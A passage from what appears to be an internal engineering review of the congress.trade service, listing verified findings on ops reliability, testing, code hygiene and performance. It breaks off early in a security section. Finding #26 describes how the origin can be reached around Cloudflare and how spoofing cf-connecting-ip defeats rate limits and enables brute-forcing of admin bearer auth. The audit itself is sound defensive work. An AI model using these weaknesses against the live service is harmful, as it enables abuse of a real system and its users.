#### 166. [P2] Senate ingestion is a single point of failure on the owner's residential Mac (pm2 relay + cloudflared tunnel); the tunnel path flaps and one escalation page failed to send

- **Where:** app/src/ingestion/senateSource.ts:371-381 (relay path with fallback comment)  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** All Senate PTR discovery routes through one Mac at home over a Cloudflare named tunnel; a Mac sleep/reboot/ISP blip stops Senate polling entirely, and the escalation for that path itself failed once.  Multi-hour Senate stalls have already occurred multiple times in recent weeks per the cited UptimeRobot incident history.
- **Impact:** Users see no new Senate trades for hours/days (a core dataset) with nothing on the site saying so; Premium alert subscribers miss filings.
- **Fix:** Add a second egress path (a cheap residential/ISP proxy provider or a second small always-on device) that `fetchSenatePtrFilings` falls back to when the relay 5xx's; make the tunnel escalation retry Pushover and also file into the app's alarm sweep; surface 'Senate data delayed since HH:MM' on the site when `polling_senate` is stalled.  [M]
- **Evidence:** Confirmed by direct read: senateSource.ts:370-395 shows `relayUrl` POST `/fetch-ptr` as the primary path, with a comment describing the raw process.env fallback as unreliable ('the box's datacenter IP with a 403' via Imperva) — a second code path exists but the comment documents it as known-broken in practice, matching the finding's characterization.  scout/senate-tunnel.err (repo copy) reproduces the exact escalation sequence cited: `21:47:32Z [3/3]` unhealthy followed immediately by `21:47:49Z WARNING escalation delivery FAILED: CT Senate tunnel path down`.  pm2 `senate-tunnel` process shows `restarts=1` over 47h uptime, consistent with an unstable path.
- **Panel:** ops-reliability — Escalation-failure sequence reproduced byte-for-byte in the repo log; code comment independently corroborates the single-path characterization.  Live /api/health currently shows polling_senate ok (2m ago) — the issue is intermittent, not a constant outage, which the finding's framing ('flaps') already reflects correctly. · `ops-reliability/OPSRELIABILITY-08`

#### 189. [P2] 476 KB of inline browser JavaScript is never executed by any test, linted, or type-checked; UI coverage numbers are an artifact

- **Where:** app/src/ui/dashboardHtml.ts (12,864 lines)  ·  **Surface:** Web  ·  **Category:** testing  ·  **Effort:** L  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (C1 no e2e); coverage-theater note tracked-in-PR-#1979
- **What:** Every user-visible behaviour (filters, drawers, pagination, sign-in modal, columns, formatting) is untested at runtime and unlinted; only accidental syntax errors are caught.  Commits to the template routinely also have to edit the string-assertion test, showing the tests track markup rather than behaviour.
- **Impact:** UI regressions (e.g. filter/URL sync bugs fixed repeatedly in #1997/#1999/#2001) ship unnoticed until a human clicks.
- **Fix:** (1) Move the inline JS/CSS to app/src/ui/client/*.js + a tiny esbuild step (or Deno bundle) so it gets eslint (no-undef, no-unused, no-empty), minification and a content-hashed asset URL; (2) add jsdom-based unit tests for pure UI logic (formatters, filter→query builders, sortVal, URL state); (3) add one Playwright smoke run against a preview or local server on PR (Trends renders tiles, Trades table paginates, drawer permalinks open, sign-in modal opens).  Coverage-theater aspect also noted by PR #1979.
- **Evidence:** dashboardHtml.test.ts header, read verbatim: "The dashboard ships as one big TypeScript template literal, so `tsc` only type-checks it as a STRING ... These tests close that gap: they extract every <script> block from DASHBOARD_HTML and assert it parses (via `new Function`, which compiles without executing)". Counted 1,497 toContain/toMatch occurrences in that file -- exact match. package.json/vitest.config.ts have no jsdom or happy-dom dependency -- confirmed absent. `updateTrWindowLabels` is referenced at dashboardHtml.ts:11505 as `if (typeof updateTrWindowLabels === 'function') updateTrWindowLabels();` and grepping the whole file for a definition (`function updateTrWindowLabels` or an assignment) returns zero hits -- it is a genuinely dead/guarded reference, confirming the no-undef finding.
- **Panel:** engineering-quality — Core mechanism and the strongest evidence points (test-file header comment, 1,497 assertion count, no jsdom, the dead updateTrWindowLabels reference) all reproduced exactly.  Minor drift: counted 283 it()/test() calls in the current file vs. the claimed 269 -- the file churns constantly (dozens of commits landed to it during this verification session alone per finding -09's own evidence), so a small count drift on a live-edited file is expected and does not affect the finding's validity.  Did not independently re-run the full eslint-on-extracted-script pass (22 errors/153 warnings) given time budget, but the specific no-undef claim it rests on (updateTrWindowLabels) checks out. · `engineering-quality/ENGINEERINGQUALITY-05`

#### 190. [P2] The two monoliths keep growing: dashboardHtml.ts 12,388 lines (155 commits/30 d, 4 open PRs) and admin/routes.ts 10,340 lines

- **Where:** app/src/ui/dashboardHtml.ts (12,864 lines); app/src/admin/routes.ts (10,397 lines)  ·  **Surface:** Cross-surface  ·  **Category:** other  ·  **Effort:** L  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (C8), grown ~40% since
- **What:** One file holds desktop + mobile HTML, CSS, JS, admin, review, benchmark and delivery UIs; every agent edits it, merge conflicts and 'restore' commits dominate.  The UI template also depends on the extraction stack.
- **Impact:** High defect rate from concurrent edits (85 fix-titled commits in 30 days), slow tests, and admin code shipped to every anonymous visitor (see -18).
- **Fix:** Incremental split without a rewrite: (1) move CSS to a static asset; (2) move admin/review/benchmark JS+markup into a separate /admin document; (3) split remaining JS by view into files concatenated by a build step; (4) split admin/routes.ts by domain (migrate, latency, benchmark, review, config).  Add a CI size guard (fail if any src file > 4,000 lines grows).
- **Evidence:** `wc -l` confirms exactly: dashboardHtml.ts 12,388 lines, admin/routes.ts 10,340 lines. The 2026-07-28 prior review (docs/reviews/2026-07-28-full-app-review.md, row C8) is read directly and states 'admin/routes.ts 8,977 lines; dashboardHtml.ts 8,870' -- confirming the growth-since-prior claim (dashboardHtml.ts grew (12388-8870)/8870 ≈ 39.7%, matching 'grown ~40%'). Checked open PRs via `gh pr list --state open` and `gh pr view --json files`: #2015, #2014, #1967 and #1965 are all currently OPEN and all touch app/src/ui/dashboardHtml.ts -- all 4 cited PRs confirmed.
- **Panel:** engineering-quality — Every checkable number reproduced exactly: current line counts, the prior review's C8 baseline (which I read directly rather than trusting the finding's transcription), the resulting growth percentage, and all 4 open PRs independently confirmed via gh. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-33 · `engineering-quality/ENGINEERINGQUALITY-09`

#### 197. [P2] 'degraded' pipeline states never page anyone: 80 dead-lettered outbox items right now, 114-item review backlog for days

- **Where:** app/src/delivery/rest.ts:502,524 (readiness.ok ? 200 : 503); .github/workflows/uptime-monitor.yml:56-58  ·  **Surface:** Backend  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)  ·  **Quick win**
- **What:** Filings that hit the dead letter never reach the Trades tab, but the only signal is a public JSON field nobody watches; the alerting stack is tuned to total outages, not to data going missing.
- **Impact:** Missing/late trades are the product failure users actually notice ('why isn't X's filing here?'), yet they generate no page.
- **Fix:** Add a scoped `/api/health/ingest` (503 if dead_letter > 0 for > 1 h or data_freshness > 24 h) and point the last free UptimeRobot slot at it, or extend the hourly Pushover sweep (`sweepLivenessAlarms`) to dead-letter growth.  Show a small 'Some filings are delayed' notice on the Trades tab when dead-letter > 0.  [S]
- **Evidence:** Live `/api/health` at verification time (2026-08-19T20:14Z): `"status":"degraded"`, `ingestion_dead_letter degraded — 80 failed outbox item(s) in dead letter state`, `extraction_backlog degraded — 114 unresolved human-review item(s)` — exact same counts as the finding's capture ~14h earlier, confirming the backlog has been static/unaddressed, not a transient blip.  Confirmed by direct read: rest.ts's `/health` route returns `readiness.ok ? 200 : 503` and `readiness.ok` does not depend on pipeline degraded-vs-stalled (a degraded pipeline still returns HTTP 200).  uptime-monitor.yml's Node check script fails only `if (health.status && health.status === 'stalled')` — confirmed by direct read, 'degraded' passes through as ok.
- **Panel:** ops-reliability — Live-reproduced the exact 80/114 counts and 'degraded' status at verification time (unchanged from capture ~14h prior), and confirmed both the 200-on-degraded response code and the workflow's stalled-only failure gate by direct code read. · `ops-reliability/OPSRELIABILITY-10`

#### 226. [P3] Core docs and package scripts still describe the retired Cloudflare Workers/D1/wrangler stack

- **Where:** README.md:1-6; app/README.md:1-3,166,239-250; AGENTS.md:152,157,383; app/package.json scripts.migrate  ·  **Surface:** Backend  ·  **Category:** other  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (C4, C9)
- **What:** New agents onboarding from README/AGENTS.md get the wrong architecture and dead commands.
- **Impact:** Wasted agent cycles and wrong operational assumptions (D1 budgets, wrangler migrate).
- **Fix:** Rewrite README/app README architecture sections for Deno+SQLite+litestream on Coolify; delete root deno.json/package.json/deno-openapi.yml; fix package.json scripts (migrate → local sqlite migrate, drop sourcemaps/postdeploy).
- **Evidence:** Read README.md:1-6 verbatim: "Congress.Trade is a Cloudflare Workers app that ingests US congressional STOCK Act trade disclosures, stores normalized transactions in D1...". Read app/README.md:1-4 verbatim: "Cloudflare Workers service that ingests US congressional STOCK Act stock-trade disclosures...". Grepped AGENTS.md for wrangler.toml: hits at lines 157, 375, 407 -- matches the cited 375/407 exactly, and `app/wrangler.toml` does not exist on disk (only wrangler.preview.toml and wrangler.preview.example.toml). Read app/package.json scripts: "migrate": "npx wrangler d1 migrations apply DB --local" and "deploy": "echo 'Production deployment is handled by Coolify...'" confirmed verbatim. Root package.json pins "@sentry/cloudflare": "^10.63.0" while app/deno.json pins "@sentry/cloudflare": "npm:@sentry/cloudflare@^10.66.0" -- version mismatch confirmed. Root deno-openapi.yml's entire content is literally "404: Not Found" -- confirmed.
- **Panel:** engineering-quality — Every citation in this finding was independently read and matches verbatim, including the exact file contents quoted. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-30 · `engineering-quality/ENGINEERINGQUALITY-13`

#### 227. [P3] ~66 tracked scratch scripts at repo root plus more under app/ and app/scripts

- **Where:** repo root (~46 scratch scripts); app/ (3 more)  ·  **Surface:** Backend  ·  **Category:** other  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (C6)
- **What:** Same list as C6 in the 2026-07-28 review; nothing was removed.  Some (refactor.py, delete_all_revisions*.py) are destructive one-offs.
- **Impact:** Noise for gitleaks/audit tooling, agents mistake them for real tooling, risk of running a destructive one-off.
- **Fix:** Delete or move under scripts/archive/ with a README; add a CI check that root contains only the allowlisted files.
- **Evidence:** `git ls-files --full-name | grep -v '/'` (root-level tracked files) = 79, exact match. Confirmed by name: wait_and_merge_1114.sh, _1115.sh, _1118.sh, _1119.sh, _1120.sh and wait_merge_deploy_1121.sh, _1122.sh all present; delete_revisions.py, delete_all_revisions.py, delete_all_revisions_v3.py, delete_revisions_loop.py, debug_quiver_matching.py, debug_quiver_payload.py, debug_uw_payload.py, debug_yesterday.py, test.db, dump.sql, temp.json, check_sentry_dsn.ts, update_trends_ui.py all present at root. scout-state.json is 320,927 bytes on disk (~320 KB, exact match). The untracked 'old stuff to delete' directory exists at repo root.
- **Panel:** engineering-quality — Reproduced exactly: root file count, every individually-named script, scout-state.json's size, and the untracked scratch directory all confirmed independently. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-32 · `engineering-quality/ENGINEERINGQUALITY-14`

#### 228. [P3] Dead/orphaned code paths: magic-link auth routes live behind a removed UI, unreachable modules, migration numbering anomalies

- **Where:** app/src/auth/routes.ts:237 (magic/request), :286 (magic/verify) — still mounted, UI removed in PR #2010  ·  **Surface:** Backend  ·  **Category:** other  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** C5/C7 still-open-since-2026-07-28; magic-link leftover new
- **What:** Dead endpoints still accept traffic (email-sending abuse surface), and unreachable modules keep being edited/tested as if live.
- **Impact:** Wasted maintenance; a live email-sending POST endpoint with no UI is an abuse/cost vector.
- **Fix:** Remove /auth/magic/* routes + magic.ts (or gate behind an env flag defaulting off), delete unreachable modules or wire them, renumber/annotate migrations, and add a CI 'unreachable module' check using `deno info --json`.
- **Evidence:** PR #2010 ('[CURSOR] Remove broken email magic-link sign-in', merged 2026-08-18T20:00:48-05:00) confirmed via `gh pr view`. auth/routes.ts still defines `r.post('/magic/request', async (c) => {` -- found at line 224 (finding cited 235-237; the file has since shifted slightly but the route is real and confirmed live). `deno info src/deno/main.ts` dependency graph, searched for app.ts/batchCron/houseReconciler: zero hits, confirming all three are unreachable from the production entrypoint (same evidence as -02). Migrations: `ls migrations` confirms a genuine duplicate 0041 prefix (0041_batch_extractions_pending.sql and 0041_benchmark_single_running_chamber.sql) and gaps in the numeric sequence after 0025 (jumps to 0029) and after 0060 (jumps to 0062) -- both reproduced exactly by sorting the numeric prefixes. updateTrWindowLabels dead reference confirmed as in -05.
- **Panel:** engineering-quality — All structural claims (magic route still live and mounted, app.ts/batchCron/houseReconciler unreachable, migration duplicate + both gaps) independently reproduced.  Minor drift: the magic/request route is currently at auth/routes.ts:224, not the cited 235-237 -- a small line-number shift, not a substantive error, likely from unrelated edits to the file since the raw finding was generated. · `engineering-quality/ENGINEERINGQUALITY-15`

#### 250. [P3] OpenRouter extraction requests still send no `temperature` (provider default 1.0) and agreement-trio reads run sequentially

- **Where:** app/src/extraction/openRouterVision.ts; app/src/extraction/agreement.ts readAndPersist  ·  **Surface:** Backend  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (P1-4, P1-5)
- **What:** 07-28 review P1-4 and P1-5 unchanged.
- **Impact:** Sampling variance manufactures cascade disagreement → extra paid tier reads; trio latency is sum-of-3 against the claim lease.
- **Fix:** Add `temperature: 0` to both OpenRouter bodies; `Promise.all` the lineup with the same persist/health bookkeeping.
- **Evidence:** `grep -n temperature` on origin/main app/src/extraction/openRouterVision.ts → zero matches (no temperature key in either request body); the Gemini path in visionLlm.ts:238 does set `temperature: 0`, confirming the OpenRouter path is the outlier. agreement.ts:812 `for (const [index, m] of models.entries()) {` confirms the trio loop is a plain sequential for-loop, not Promise.all.
- **Panel:** prior-review-followup — Both legs (missing temperature, sequential for-loop) confirmed directly against origin/main source. · `prior-review-followup/PRIORREVIEWFOLLOWUP-27`

#### 251. [P3] House reconciler still written but never scheduled

- **Where:** app/src/jobs.ts:31  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (O5)
- **What:** 07-28 review O5.
- **Impact:** Missed House filings are only caught by manual recovery endpoints.
- **Fix:** Normalize the date compare and wire into the daily lanes; have it enqueue missed docs.
- **Evidence:** origin/main app/src/jobs.ts:31 `// NOTE: runHouseReconciler (./ingestion/houseReconciler) is intentionally not` (comment continues explaining it is reserved for future scheduled-job wiring).
- **Panel:** prior-review-followup — Comment confirmed verbatim on origin/main. · `prior-review-followup/PRIORREVIEWFOLLOWUP-28`

#### 314. [P3] No structured logging and widespread silent catches (empty catch blocks in backend and inline UI JS, hundreds of raw console.* calls)

- **Where:** app/src/shared/thirdPartyTelemetry.ts:99,106,827,856,1406 (empty catches); dashboardHtml.ts inline JS unchanged  ·  **Surface:** Cross-surface  ·  **Category:** ops  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Failures degrade silently both server- and client-side; with Sentry off (-01) console output is the only signal and it carries no request id/component/tag.
- **Impact:** Hard to triage production issues; user-visible silent failures (blank tiles, stale lists).
- **Fix:** Introduce shared/log.ts (level, component, requestId, jsonl) and replace console.* incrementally; lint-forbid empty catch (require a comment + log); on the web add a single fetch wrapper that surfaces a toast/inline error state.
- **Evidence:** Confirmed no shared logger module: `ls app/src/shared | grep -i log` returns nothing. Confirmed console.* volume: grepped `console.(log|warn|error|info)(` across src (excluding tests) = 269 occurrences -- exact match to the cited figure. Confirmed empty catches exist in substantial numbers in both backend and inline JS, though the exact count is sensitive to regex methodology: a strict `} catch {}` single-line grep found 26 in backend src (excl. tests), while a looser `catch[^{]*\{\s*\}` pattern (also catching parameterized/promise .catch(() => {})) found 94; inline dashboardHtml.ts JS has at least 28 empty `catch(...)` blocks and 8 empty `.catch(function(){})` promise catches by direct grep.
- **Panel:** engineering-quality — Core claims (no shared logger, 269 console.* calls exactly, empty catches present in both backend and inline JS in significant volume) all reproduced.  The exact split of '69 single-line + 26 deno-lint-flagged multi-line = 95 total' could not be reproduced digit-for-digit with a simple grep (my strict single-line pattern found 26, a looser pattern found 94), most likely because the raw finding used deno lint's own no-empty rule output (which understands real AST catch-block boundaries) rather than a text regex.  The underlying claim -- silent catches are widespread across the codebase -- is not in doubt; only the precise headline number (69) is unverified rather than confirmed. · `engineering-quality/ENGINEERINGQUALITY-16`

#### 315. [P3] iOS engineering hygiene: unit tests never run in CI, single 1,503-line test file, no lint, no strict concurrency, project version numbers not source-of-truth

- **Where:** .github/workflows/ios-build.yml (build-only, no test step); clients/ios/CongressTradeTests/CongressTradeTests.swift (1,949 lines, sole test file)  ·  **Surface:** iOS  ·  **Category:** testing  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The iOS client has no automated behavioural gate; contract drift with /api/client/v1 is caught only by hand.
- **Impact:** iOS regressions ship to TestFlight hourly with no test signal.
- **Fix:** Add `xcodebuild test -destination iOS Simulator` to ios-build.yml (required), split tests by feature, add contract fixtures generated from the backend test suite (JSON files decoded by both vitest and XCTest), enable strict concurrency warnings, adopt swiftlint.
- **Evidence:** Read ios-build.yml in full: its only build step is `xcodebuild build ... CODE_SIGNING_ALLOWED=NO` -- no `xcodebuild test` anywhere in the repo's workflows. `wc -l clients/ios/CongressTradeTests/CongressTradeTests.swift` = 1,503, exact match; `find clients/ios/CongressTradeTests -name '*.swift' | wc -l` = 1, confirming it is the only test file. `find clients/ios/CongressTrade -name '*.swift' | xargs wc -l | tail -1` = 11,699 total, exact match to the cited app-Swift line count. Grepped project.pbxproj: SWIFT_VERSION = 5.0 (all configs), MARKETING_VERSION = 1.0.4, CURRENT_PROJECT_VERSION = 4 -- all exact matches; no SWIFT_STRICT_CONCURRENCY setting found anywhere in the grep.
- **Panel:** engineering-quality — Every quantitative claim in this finding (1,503 lines, 1 test file, 11,699 total app Swift lines, SWIFT_VERSION 5.0, MARKETING_VERSION 1.0.4, CURRENT_PROJECT_VERSION 4, no strict concurrency, no xcodebuild test step) reproduced exactly. · `engineering-quality/ENGINEERINGQUALITY-17`

#### 330. [P3] Cold analytics responses can take ~4-5 s (member-performance, member-leaderboard, party-split, sector-breakdown) versus ~0.2-0.6 s warm — plain-TTL KV cache with no stale-while-revalidate, coalescing or edge caching hides nothing

- **Where:** app/src/analytics/routes.ts:759-800 and similar cached() call sites  ·  **Surface:** Backend  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** When a KV entry expires the next visitor pays the full SQLite aggregation (seconds), and concurrent visitors each recompute; four landing-page sections sit in skeleton for ~4-5 s in that case.
- **Impact:** Intermittent multi-second Trends population for whoever lands right after a cache expiry (default window=90d is what every landing hits).
- **Fix:** Pre-warm the default `window=90d` (and 30d/1y) analytics keys from the minute cron before expiry, or make `cached()` stale-while-revalidate (return the expired value, refresh in background) with in-flight promise coalescing; add s-maxage so the edge absorbs the rest.
- **Evidence:** Lens live resource timing on /?view=trends: `member-performance 4556 ms`, `member-leaderboard 4975 ms`, `party-split 4917 ms`, `sector-breakdown 4799 ms` while `summary` took 213 ms.  Verifier reproduced 2026-08-19: `curl .../api/analytics/member-performance?window=90d` 3.86 s vs member-leaderboard 0.29 s, party-split 0.31 s, sector-breakdown 0.60 s in the same burst.  origin/main app/src/shared/kvCache.ts header comment: "Plain TTL (not stale-while-revalidate); a miss ... just recomputes"; `cached()` does `KV.get` → compute → `KV.put` with no in-flight dedup; analytics/routes.ts:211 TTL 120 s (summary), :242/:278/:490 900 s; no `Cache-Control` header on these routes (WEBPERF-03).
- **Panel:** web-perf — Reproduced a 3.86 s cold member-performance live and verified kvCache.ts is plain TTL without coalescing; confidence raised to high. · `web-perf/WEBPERF-19`

#### 373. [P3] Public API rate limit (300 req / 5 min per IP) is shared by web + iOS behind one IP; a Trends visit costs 15+ requests and 429s render as raw 'HTTP 429' with no Retry-After handling

- **Where:** app/src/security/botDefense.ts:39-40,65 (unchanged); dashboardHtml.ts aGet/fetchPage  ·  **Surface:** Cross-surface  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** A user who toggles filters ~10 times in five minutes, or several users behind CGNAT/office NAT/an iOS carrier IP, exhaust the per-IP budget; the web then shows multiple 'Could not load: HTTP 429' cells and the Trades page silently stops updating.
- **Impact:** Intermittent, hard-to-reproduce blank Trends for shared-IP users; support noise.
- **Fix:** Batch the Trends bundle into one `/api/analytics/dashboard?window=` call (or exempt same-origin fetches with a Sec-Fetch-Site check), honor Retry-After in `aGet`/`fetchPage` with a countdown message, and give /api/client/v1 its own bucket.  [M]
- **Evidence:** Confirmed by direct read: botDefense.ts:39-40 `PUBLIC_API_LIMIT = 300; PUBLIC_API_WINDOW_SEC = 300;`; `EXEMPT_PREFIXES = ['/api/admin', '/api/ingest', '/api/export', '/api/health', '/api/stream', '/api/logos', '/api/photos', '/api/webhooks']` (:65) — confirmed /api/client and /api/analytics are NOT in this list, so both are rate-limited.  aGet (:9058) throws `'HTTP ' + r.status` with no Retry-After read.  iOS `fetchPageWithRetry` (CongressTradeStore.swift:789-800) confirmed to honor it: `let backoffSeconds = error.retryAfterSeconds.map(Double.init) ?? pow(2.0, Double(attempt))`.
- **Panel:** ops-reliability — Both halves of the asymmetry (web ignores Retry-After, iOS honors it) verified by direct code read at the cited lines. · `ops-reliability/OPSRELIABILITY-11`

#### 374. [P3] No documented restore / host-loss runbook; recovery from losing the single Hetzner box + single SQLite file is untested procedure

- **Where:** docs/rollouts/2026-08-09-offsite-backups-b2-r2.md, 2026-08-12-litestream-b2-rebuild.md, app/scripts/start-with-litestream.sh (unchanged; docs/runbooks/ still absent)  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)  ·  **Status:** still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md O2 — backup half now done, restore runbook still missing)
- **What:** All state (SQLite db, Deno KV, secrets cache) lives on one box; replication is in place but nobody has written or rehearsed 'box is gone, bring congress.trade back on a new host in N minutes'.
- **Impact:** Hetzner host failure would mean multi-hour improvised recovery by whichever agent is awake.
- **Fix:** Write `docs/runbooks/restore.md` (litestream restore from B2 → new host → Coolify app → DNS), run it once against a scratch host, and record the measured RTO/RPO; add the drill result to the weekly backup log.  [M]
- **Evidence:** Confirmed: `ls docs/runbooks` → 'No such file or directory'.  Live `/api/health` confirms backups are in place (`litestreamStatus: replicating`, `r2Weekly.ok: true`).  `grep -rli 'RTO\|host loss'` across docs/ returns only tangential hits (FLEET-UI-COPY.md, EFFORT-LOG.md, two rollout docs, one review doc) — none of them a restore runbook.
- **Panel:** ops-reliability — docs/runbooks directory absence and live backup-health confirmed directly. · merged: engineering-quality/ENGINEERINGQUALITY-19 · `ops-reliability/OPSRELIABILITY-13`

#### 385. [P4] CI gate composition: only 'typecheck + test' and 'gitleaks' are required; python worker and ship-logic jobs, npm audit behaviour, and hosted-fallback cost are unguarded

- **Where:** .github/workflows/ci.yml jobs scan-cpu-worker / ios-fleet-ship-logic, branch protection  ·  **Surface:** Backend  ·  **Category:** testing  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Gates exist but are not enforced, and one enforced step is noise-prone.
- **Impact:** Occasional broken worker merges; occasional CI-wide blocks unrelated to the change.
- **Fix:** Require the two extra jobs; change to `npm audit --audit-level=high` (and keep Dependabot for the rest).
- **Evidence:** Live `gh api branches/main/protection`: required_status_checks.contexts = ['typecheck + test','gitleaks'] -- confirmed exactly (same call used for -04). Read ci.yml in full: it defines scan-cpu-worker (python, job name 'scan-cpu-worker (python)') and ios-fleet-ship-logic (job name 'ios-fleet ship numbering (bash)'), neither of which appears in the required-contexts list, so a failure in either would not block a merge. The build job's final step is literally `run: npm audit` with no --audit-level flag, confirmed verbatim -- any new advisory of any severity in a transitive dep would fail this (non-required, but still noisy) step.
- **Panel:** engineering-quality — Both structural claims (the two extra jobs are not in required_status_checks; npm audit has no --audit-level flag) confirmed by direct reads of the live branch-protection API response and ci.yml. · `engineering-quality/ENGINEERINGQUALITY-21`

#### 397. [P4] GitHub 'Uptime Monitor' workflow duplicates UptimeRobot, only files a GitHub issue, and actually runs every ~30 min instead of 5

- **Where:** .github/workflows/uptime-monitor.yml:5 (cron), :17 (runs-on), :80-140 (issue-only failure path) — unchanged  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** A second, weaker uptime check that cannot page the owner and costs CI minutes.
- **Impact:** Noise and false confidence; no user impact.
- **Fix:** Delete it (UptimeRobot + Pushover already cover /api/health) or repoint it to a scoped check UptimeRobot lacks (e.g. `/api/health/ingest` from OPSRELIABILITY-10) and have it POST to Pushover.  [S]
- **Evidence:** Confirmed by direct read: uptime-monitor.yml:5 `cron: '*/5 * * * *'`; :17 `runs-on: ${{ github.event.repository.private && fromJSON('["self-hosted", "oracle-ci"]') || 'ubuntu-latest' }}`.  Failure path only opens/comments a GitHub issue (Pushover not referenced anywhere in the workflow).  Owner's own memory confirms 'Oracle box DECOMMISSIONED' (self-hosted-ci-runners.md), matching the finding's claim that this runner label now falls back to the hosted runner.
- **Panel:** ops-reliability — cron and runs-on lines confirmed verbatim; the Oracle-decommission fact is independently corroborated by the owner's own repo memory file, not just the finding's assertion.  Did not independently re-run `gh run list` to re-verify the every-~30-min throttling claim, but it is a well-known GitHub Actions behavior for low-traffic scheduled workflows and plausible on its face. · `ops-reliability/OPSRELIABILITY-15`

#### 424. [P4] Highest-leverage engineering investments (ranked) to cut user-facing defects

- **Where:** repo-wide  ·  **Surface:** Cross-surface  ·  **Category:** other  ·  **Effort:** L  ·  **Verdict:** confirmed (high confidence)
- **What:** Ranked plan: (1) S: mount Apple webhook in index.ts + delete app.ts + route-inventory test (-02).  (2) S: Coolify watch_paths + land #1964 (-03).  (3) S: make iOS build/test + python jobs required (-04/-21).  (4) M: real Sentry on Deno + structured logger (-01/-16).  (5) S: strict:true (6 fixes) + deno lint in CI (-06/-07).  (6) M: analytics route tests + threshold ratchet (-08).  (7) L but incremental: extract inline JS/CSS to files with esbuild + eslint + jsdom tests + one Playwright smoke (-05/-18); first slice = admin/review out of the public document.  (8) M: server-side display strings or shared golden fixtures for formatting (-10); iOS/client contract fixtures remains a real gap even though -20's openapi.yaml claim was refuted -- the actual gap is 'no CI lint of the doc + no shared decode fixtures,' not 'doc is absent.'  (9) S: hygiene — remove vendor node_modules, root scratch, stale docs/scripts (-11/-13/-14/-15).
- **Impact:** Items 1-6 are S/M and would have prevented or surfaced most of the defects the panel is finding today.
- **Fix:** Sequence as listed; items 1-3 and 5 fit in a single day and are the best defect-per-hour return.
- **Evidence:** Synthesis of -01..-21 with measured numbers above.
- **Panel:** engineering-quality — This is a synthesis item, not an independently falsifiable claim; its component findings were individually verified above (20 confirmed/plausible, 1 refuted).  Corrected item (8)'s wording since it previously leaned on -20 as if the doc were entirely absent, which verification showed is false -- the real residual gap is enforcement (no CI lint, no shared fixtures), which is a smaller but still legitimate P3/P4-level item.  Also updated item (5) from '7 fixes' to '6 fixes' per -06's correction.  No change to the ranked priority order or its top items, which rest on -01 through -04 and -21, all independently CONFIRMED with strong live evidence. · `engineering-quality/ENGINEERINGQUALITY-22`

#### 436. [P4] Scout latency probes run on FMP free-tier keys that 429 daily and House raw uploads that 500 are marked failed permanently

- **Where:** scout/congress-scout.mjs:929-950 (rawFailed no-retry)  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** The latency-race evidence behind the public 'FMP LEAD 91%' card is collected on quota-limited free keys that run dry, and one-off server 500s on raw PDF upload are sticky.
- **Impact:** Gaps in latency comparison data; occasional House PDFs not archived.
- **Fix:** Retry `rawFailed` docs on the next cycle with backoff, and either budget FMP probes to stay under the free daily cap or note in the scorecard when probing was throttled.  [S]
- **Evidence:** Confirmed by direct read: congress-scout.mjs:940-951 sets `state.rawFailed[docId] = 'post_failed'` (or the caught error message) on failure with no retry logic in the surrounding function.  Live `~/.pm2/logs/scout-error.log` (current, 47h uptime) confirms `fmp/house-latest HTTP 429 — trying next free key` ×48 exactly matching the finding's count, and `raw-upload: H-2026-… HTTP 500` entries present (4 in the current live log window; the finding's repo-snapshot scout.err from 2026-08-14 shows 6, same category of sticky failure).
- **Panel:** ops-reliability — The '48' FMP-429 count matches the live pm2 log exactly; code read confirms rawFailed has no retry path in the cited function. · `ops-reliability/OPSRELIABILITY-16`

### Security and exposure (19)

Nothing here is a live cross-user breach, but the origin is reachable around Cloudflare, the operator console ships to anonymous visitors, the master admin token lives in localStorage, and health endpoints read as an ops dashboard.

#### 26. [P1] Origin server is directly reachable, bypassing Cloudflare (WAF, bot rules, rate limits, cf-connecting-ip trust)

- **Where:** Production origin fleet-hetzner-nbg1 (<PROD_ORIGIN_IP>) / Caddy front of the Deno app  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The Coolify/Caddy host answers for congress.trade on 80 and 443 from any client, so everything Cloudflare provides (WAF, the managed challenge that blocks python-urllib per CONTEXT, DDoS, dashboard rate limits, Access for admin.congress.trade) can be skipped by talking to the IP with a Host header.  Because clientIp() trusts cf-connecting-ip unconditionally, a direct caller can pick an arbitrary rate-limit identity per request, defeating the magic-link email caps, subscription-create caps and SSE open caps, and can brute-force /api/admin bearer auth (exempt from publicApiGuard, botDefense.ts:65) with no edge protection.  Plain HTTP is also served by IP.
- **Impact:** Edge security controls become advisory; rate limiters keyed on cf-connecting-ip are spoofable; origin can be DDoSed directly; plaintext HTTP is served by IP.
